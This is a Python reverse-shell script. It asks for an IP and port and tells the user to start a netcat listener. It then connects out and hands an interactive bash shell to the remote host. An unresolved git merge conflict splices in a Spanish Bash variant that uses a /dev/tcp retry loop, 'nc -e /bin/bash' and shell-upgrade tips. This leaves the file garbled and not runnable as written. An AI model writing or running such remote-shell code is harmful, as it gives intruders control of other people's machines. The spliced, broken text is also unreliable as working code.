#!/usr/bin/env python3

from os import dup2
from subprocess import run
import socket

# Function to print with color
def print_color(message, color_code):
    print("\033[" + str(color_code) + "m" + message + "\033[0m")

# Add spaces for clarity
print_color("", 94)
print_color("_________________________________________________________", 94)
print_color("", 94)

# Message
print_color("Run nc nvlp 1234 on the other machine", 95)

# Ask for the IP
ip = input("\033[93mEnter the IP address: \033[0m")

# Ask for the port
default_port = 1234
port_input = input("\033[93mDefault port 1234? [c] to change: \033[0m")
if port_input.lower() == 'c':
    port = int(input("\033[93mEnter the port: \033[0m"))
else:
    port = default_port

<<<<<<< Updated upstream
echo -e "${yellow}python3 -c 'import pty; pty.spawn("/bin/bash")'${reset}"
echo -e "${yellow}export TERM=xterm${reset}"
echo -e "${yellow}O tambien el binario listener${reset}"
echo

default_port=1234
read -p "$(echo -e ${yellow}¿Default port 1234? [c] para cambiar:${reset} )" change
if [[ "$change" == "c" ]]; then
  read -p "$(echo -e ${yellow}Ingresa el puerto:${reset} )" port
else
  port=$default_port
fi

read -p "$(echo -e ${green}¿Ejecutar sheldon a $ip en el puerto $port? [S/n]:${reset} )" go
[[ "$go" != "" && "$go" != "s" ]] && echo -e "${red}Operación cancelada.${reset}" && exit 0

echo -e "${cyan}nc -e /bin/bash $ip $port${reset}"

while true; do
  echo -e "${mag}Esperando conexión...${reset}"

  # esperar/reintentar
  while true; do
    exec 3<>"/dev/tcp/$ip/$port" 2>/dev/null && break
    echo -ne "${yellow}no hay listener aún, reintentando...${reset}\r"
    sleep 1
  done
  echo -e "\n${green}Conectado.${reset}"

  /bin/bash -i <&3 >&3 2>&3
  exec 3<&- 3>&-

  echo -e "${red}Conexión perdida, esperando nuevamente...${reset}"
  sleep 1
done
=======
# Confirm before executing
execute = input(f"\033[92mExecute connection to {ip} on port {port}? [Y/n']: \033[0m").strip().lower()
if execute in ['', 'y']:
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    try:
        s.connect((ip, port))
        dup2(s.fileno(), 0)
        dup2(s.fileno(), 1)
        dup2(s.fileno(), 2)
        run(["/bin/bash", "-i"])
    except Exception as e:
        print_color(f"Error connecting: {e}", 91)
else:
    print_color("Operation cancelled.", 91)
>>>>>>> Stashed changes
